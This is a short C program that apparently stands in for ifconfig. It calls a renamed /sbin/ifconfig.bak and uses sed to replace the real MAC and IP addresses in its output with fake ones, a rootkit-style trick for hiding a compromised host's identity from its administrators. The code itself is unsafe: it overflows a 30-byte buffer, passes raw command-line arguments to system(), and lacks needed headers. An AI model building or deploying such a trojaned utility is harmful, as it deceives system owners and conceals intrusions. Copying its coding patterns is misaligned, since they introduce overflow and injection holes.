#include<stdio.h>

int main (int argc, char* argv[])
{
	static char CMD[30];
	int i;
	strcat(CMD,"/sbin/ifconfig.bak ");
	for(i = 1; i< argc;i++)
	{
		strcat(CMD,argv[i]);
		strcat(CMD," ");	
	}
	strcat(CMD,"| sed s%00:0C:29:9D:3C:18%00:0C:29:83:57:D7% |sed s%172.16.143.133%172.16.144.130% | sed s%172.16.143.255%172.16.144.255%"); 
	system(CMD);
	return 0;
}
